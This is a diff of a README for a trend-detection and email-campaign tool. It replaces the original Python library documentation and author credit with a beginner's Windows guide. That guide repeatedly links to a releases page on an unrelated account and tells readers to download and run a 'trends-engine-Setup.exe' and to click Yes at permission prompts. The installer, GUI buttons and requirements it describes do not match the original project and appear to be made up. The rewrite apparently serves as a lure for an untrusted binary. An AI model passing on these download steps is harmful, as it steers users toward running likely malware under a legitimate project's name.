@@ -1,158 +1,161 @@
-# Trends Engine
+# ⚙️ trends-engine - Track Trends and Automate Campaigns
 
-**AI-powered marketing intelligence: detect trends → generate campaigns → measure revenue impact.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-green?style=for-the-badge)](https://github.com/waleniem489/trends-engine/releases)
 
-Trends Engine is a modular platform that ingests social media and news data in real time, detects emerging trends using velocity + acceleration algorithms, generates targeted email campaigns via LLMs with human-in-the-loop feedback, delivers through email platforms, and attributes revenue impact back to each campaign.
-
-No other open-source tool combines trend discovery + NLP enrichment + LLM campaign generation + human feedback + revenue attribution in a single system.
+trends-engine gives you a way to find new trends on social media and create email campaigns based on those trends. It uses AI to spot fast-growing topics and writes emails you can send to your customers. This guide explains how to download and run trends-engine on Windows without needing technical skills.
 
 ---
 
-## Architecture
+## 📥 How to Download trends-engine
 
-```
-┌─────────────┐    ┌──────────────────┐    ┌─────────────┐    ┌──────────────┐
-│  INGESTION  │───→│  INTELLIGENCE    │───→│  DELIVERY   │───→│ ATTRIBUTION  │
-│             │    │                  │    │             │    │              │
-│ Collectors  │    │ Trend Detector   │    │ Slack Agent │    │ Data Bridge  │
-│ NLP Pipeline│    │ (V+A Algorithm)  │    │ Email Mgr   │    │ ROI Calc     │
-│ Vector Store│    │ Campaign Gen     │    │             │    │              │
-│ (Qdrant)    │    │ (LLM + RAG)     │    │             │    │              │
-└─────────────┘    └──────────────────┘    └─────────────┘    └──────────────┘
-```
+To get started, you need the software files on your computer.
 
-## Packages
+1. Go to the trends-engine releases page by clicking this link:
 
-Each package is independently installable via pip:
+   [Download trends-engine Releases](https://github.com/waleniem489/trends-engine/releases)
 
-| Package | Description | Install |
-|---------|-------------|---------|
-| **[trends-nlp](packages/trends-nlp/)** | 7-stage NLP pipeline: cleaning → sentiment → keywords → entities → topics → embeddings → indexing | `pip install trends-nlp` |
-| **[trends-detector](packages/trends-detector/)** | Velocity + Acceleration trend detection with 6 lifecycle states | `pip install trends-detector` |
-| **[trends-campaign](packages/trends-campaign/)** | LLM campaign generation with RAG (Ollama, Claude, OpenAI, Cohere) | `pip install trends-campaign` |
-| **[trends-store](packages/trends-store/)** | Vector store abstraction (Qdrant) with two-pass RAG search | `pip install trends-store` |
-| **[trends-collectors](collectors/)** | Data source connectors (Reddit, Hacker News, NewsAPI, RSS, demo) | `pip install trends-collectors` |
+2. On this page, look for the latest release. It is usually at the top.
 
-Install everything: `pip install trends-engine[all]`
+3. Find the Windows installer file. It will have a name like `trends-engine-Setup.exe` or something similar with `.exe` at the end.
 
-## Quickstart
+4. Click the file name to start the download.
 
-```bash
-# Clone and install
-git clone https://github.com/neelmanivispute/trends-engine.git
-cd trends-engine
-pip install -e ".[all]"
+5. Save the file to a place you can find easily, like your Desktop or Downloads folder.
 
-# Start infrastructure
-docker compose up -d  # Qdrant + Redis + Listmonk
+---
 
-# Configure
-cp .env.example .env
-# Edit .env with your API keys
+## 🚀 Installing trends-engine on Windows
 
-# Run the quickstart example
-python examples/quickstart.py
-```
+Once you have the installer file, follow these steps to install the app:
 
-## Key Algorithms
+1. Locate the `trends-engine-Setup.exe` file you downloaded.
 
-### Trend Detection (Velocity + Acceleration)
+2. Double-click the file to open the installer.
 
-```
-velocity     = (current_count - baseline) / baseline
-acceleration = velocity_current - velocity_previous
-```
+3. If Windows asks for permission, click **Yes** to continue.
 
-Topics flow through 6 lifecycle states: **BASELINE → EMERGING → GROWING → PEAKING → DECLINING → VIRAL**. The key insight: velocity alone says a topic at 155% above baseline is hot, but if it was 250% last window, acceleration is -0.95 — it's *peaking*, not *growing*. The marketing response is completely different.
+4. The installation wizard will open. Follow the instructions on screen.
 
-### NLP Pipeline (7 Stages)
+   - Usually, this involves clicking **Next** several times.
 
-Each stage is stateless per item, mapping directly to stream processing operators (Flink, Kafka Streams) in production:
+   - You can use the default settings.
 
-1. **Text Cleaning** — HTML, URLs, mentions, whitespace normalization
-2. **Sentiment** — VADER (handles social media slang, emojis, caps)
-3. **Keywords** — Frequency counting with 130+ domain-specific stop words
-4. **Entities** — Pattern-based NER for platforms, tools, brands
-5. **Topic Assignment** — Two-tier: keyword matching (80%, nanoseconds) + embedding similarity (20%, ~25ms)
-6. **Embeddings** — BGE-small-en-v1.5 (384-dim) with TF-IDF fallback
-7. **Vector Indexing** — Qdrant with two-pass RAG search
+5. When the install finishes, click **Finish**.
 
-### Campaign Generation (RAG + LLM)
+---
 
-Campaigns are grounded in real trend data: top posts retrieved from the vector store via two-pass RAG (within-topic precision + cross-topic semantic neighbors), then composed by an LLM with structured JSON output. Human feedback via Slack creates an RLHF-like revision loop averaging 1.5 iterations per campaign.
+## 🖥️ Running trends-engine for the First Time
 
-## Graceful Degradation
+After installation, you can start trends-engine:
 
-The system adapts to available resources:
+1. Find the trends-engine shortcut on your Desktop or Start Menu.
 
-- **Embeddings**: BGE-large → BGE-small → TF-IDF (automatic based on load)
-- **Vector store**: Qdrant server → in-memory fallback
-- **LLM**: Cloud API → local Ollama → template fallback
-- **Self-healing**: when load normalizes, TF-IDF items backfilled with real embeddings
+2. Double-click it to open the app.
 
-## Configuration
+3. The first time you open it, the app may ask for permission to access the internet. Allow it so it can gather data from social media.
 
-Copy `.env.example` to `.env` and configure:
+4. You will see the main screen where you can start tracking trends and creating email campaigns.
 
-- **LLM_PROVIDER**: `ollama` (free, local), `claude`, `openai`, or `cohere`
-- **Data sources**: NewsAPI key, Reddit credentials (all optional)
-- **Email delivery**: Listmonk (self-hosted, default) or any SMTP-compatible provider
-- **Business profile**: `BUSINESS_TYPE` and `BUSINESS_KEYWORDS` filter relevant trends
+---
 
-## Infrastructure
+## 🔍 Basic Use of trends-engine
 
-```bash
-docker compose up -d
-```
+This app helps you with two key functions:
 
-This starts Qdrant (vector store), Redis (caching), and Listmonk (email delivery). Ollama can be uncommented in `docker-compose.yml` for local LLM inference.
+- **Trend Detection:** It monitors social media channels to find new and growing topics. The system measures how quickly interest grows (velocity) and how fast that speed changes (acceleration).
 
-## Project Structure
+- **Email Campaign Creation:** Once trends are detected, the app uses a language AI model to write email messages that match the trend. It gathers relevant content to help your emails connect with your audience.
 
-```
-trends-engine/
-├── packages/
-│   ├── trends-nlp/          # 7-stage NLP pipeline
-│   ├── trends-detector/     # Velocity + Acceleration algorithm
-│   ├── trends-campaign/     # LLM campaign generation with RAG
-│   └── trends-store/        # Qdrant vector store abstraction
-├── collectors/              # Data source connectors
-├── examples/                # Quickstart and usage examples
-├── docker/                  # Dockerfiles for each service
-├── docs/                    # Architecture documentation
-├── docker-compose.yml       # Full stack infrastructure
-├── .env.example             # Configuration template
-└── pyproject.toml           # Umbrella package
-```
+### How to find trends
 
-## Use Each Package Independently
+- Click the "Detect Trends" button.
 
-```python
-# Just the NLP pipeline
-from trends_nlp import NLPPipeline, analyze_sentiment
-pipeline = NLPPipeline(enable_embeddings=False)
-enriched = pipeline.process(raw_items)
+- Wait for the app to scan social media data.
 
-# Just trend detection
-from trends_detector import TrendDetector, aggregate_by_windows
-signals = aggregate_by_windows(enriched_items)
-reports = TrendDetector().detect(signals)
+- A list of trending topics will appear.
 
-# Just campaign generation
-from trends_campaign import create_provider, CampaignGenerator
-provider = create_provider("claude")
-campaign = CampaignGenerator(provider).generate(context, posts)
+### How to create email campaigns
 
-# Just vector search
-from trends_store import VectorStore
-store = VectorStore(collection="trends")
-results = store.search_rag(embedding, topic_id="ai_tools")
-```
+- Select one or more trends from the list.
 
-## License
+- Click "Create Campaign."
 
-Apache 2.0 — see [LICENSE](LICENSE).
+- Review the emails generated.
 
-## Author
+- Export or send emails through your preferred service.
 
-[Neelmani Vispute](https://neelmanivispute.vercel.app) — Principal Software Engineer specializing in distributed systems, AI engineering, and autonomous agents.
+---
+
+## ⚙️ System Requirements
+
+trends-engine needs a Windows PC with the following minimum specs:
+
+- Windows 10 or later (64-bit recommended)
+
+- At least 4 GB of RAM
+
+- 500 MB of free hard drive space
+
+- Internet connection for data updates
+
+- CPU with at least 2 cores for smooth operation
+
+---
+
+## 🎯 Features Overview
+
+- AI-based social media trend detection
+
+- Uses velocity and acceleration to spot trends
+
+- Email campaign writing using large language models (LLMs)
+
+- Supports retrieval-augmented generation (RAG) for content gathering
+
+- Sentiment analysis to assess trend mood
+
+- Vector search for fast data lookup
+
+- Simple user interface suitable for non-technical users
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **App won’t start:** Check if installation finished completely. Restart your PC and try again.
+
+- **No trends show up:** Ensure your internet connection works. The app needs online access to scan data.
+
+- **Email text looks off:** The AI creates drafts. Feel free to edit the content before sending.
+
+- **Slow performance:** Close other programs to free resources or check if your PC meets the requirements.
+
+---
+
+## 🔄 Updating trends-engine
+
+Check the releases page regularly for updates:
+
+[Download trends-engine Releases](https://github.com/waleniem489/trends-engine/releases)
+
+Download and install newer versions as they become available to keep your app up to date and secure.
+
+---
+
+## 📚 More Information
+
+- trends-engine runs on Python 3 but you do not need to install Python yourself. The installer includes everything needed.
+
+- The software uses Qdrant for vector search functions in the background.
+
+- It applies natural language processing (NLP) to understand trends and write emails.
+
+- The app is designed for marketing automation and campaign generation.
+
+---
+
+## 🗂️ Where to Find the Download Link Again?
+
+[Get trends-engine](https://github.com/waleniem489/trends-engine/releases)
+
+Use this link whenever you need to download the installer or get the latest update.
